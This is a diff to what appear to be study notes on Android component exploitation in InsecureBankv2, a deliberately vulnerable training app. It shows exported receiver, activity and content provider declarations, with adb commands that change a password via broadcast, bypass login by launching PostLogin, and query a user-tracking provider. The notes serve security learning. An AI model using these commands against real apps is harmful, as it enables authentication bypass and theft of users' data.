@@ -4,15 +4,20 @@
 - [Broadcast Receiver](#BroadcastReceiver)
   - [Broadcast Receiver Discription](#Broadcast_receiver_description)
   - [Exported Broadcast Receiver](#Exported_broadcast_receiver)
-    - [AndroidManifest declaration](#AndroidManifest.xml)
-    - [Method code implementation](#method_code)
-    - [ADB exploitation](#adb_exploitaion)
+    - [Broadcast Receiver AndroidManifest declaration](#BR_AndroidManifest.xml)
+    - [Broadcast Receiver method code implementation](#BR_method_code)
+    - [ADB Broadcast Receiver exploitation](#adb_BR_exploitaion)
 - [Activity](#Activity)
   - []()
-    []()
+  - []()
   - [Exported Activity Bypassing](#Exported_activity_bypassing)
     - [Manifset](#Manifset)
-
+- [Content Provider](#Content_provider)
+  - [Content Provider Discription](#Content_Provider_Discription)
+  - [Exported Content Provider](#Exported_content_provider)
+    - [Content Provider AndroidManifest declaration](#CP_BR_AndroidManifest.xml)
+    - [Content Provider method code implementation](#CP_method_code)
+    - [ADB Content Provider exploitation](#adb_CP_exploitaion)
 # Manifest
 
 ## Debug
@@ -26,7 +31,7 @@ Broadcast receivers are designed to listen to system wide events called broadcas
 
 ## Exported_broadcast_receiver
 
-### AndroidManifest.xml
+### BR_AndroidManifest.xml
 ```
 <receiver android:name="com.android.insecurebankv2.MyBroadCastReceiver" android:exported="true">
             <intent-filter>
@@ -34,7 +39,7 @@ Broadcast receivers are designed to listen to system wide events called broadcas
             </intent-filter>
         </receiver>
 ```
-### method_code
+### BR_method_code
 ```
 public void onReceive(Context context, Intent intent) {
         String phn = intent.getStringExtra("phonenumber");
@@ -57,7 +62,7 @@ public void onReceive(Context context, Intent intent) {
         }
     }
 ```
-### adb_exploitaion
+### adb_BR_exploitaion
 ```
 am broadcast -a theBroadcast -n com.android.insecurebankv2/com.android.insecurebankv2.MyBroadCastReceiver –es phonenumber 0123456789 –es newpass Test_pass123!
 ```
@@ -72,4 +77,25 @@ am broadcast -a theBroadcast -n com.android.insecurebankv2/com.android.insecureb
 android:name="com.android.insecurebankv2.PostLogin" android:exported="true"/>
 
 Bypassing: adb shell am start -n com.android.insecurebankv2/com.android.insecurebankv2.PostLogin
+```
+-------------------------------------------------------------------------------------------------------------------------------
+# Content_Provider
+
+## Content_Provider_Discription
+Content providers are used to share app data with other applications, which is normally stored inside a database or file.
+
+## Exported_content_provider
+
+### CP_BR_AndroidManifest.xml
+```
+provider android:name="com.android.insecurebankv2.TrackUserContentProvider" android:exported="true" android:authorities="com.android.insecurebankv2.TrackUserContentProvider"/>
+```
+### CP_method_code
+```
+static final String URL = "content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers";
+static final String name = "name";
+```
+### adb_CP_exploitaion
+```
+content query --uri content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers    
 ```
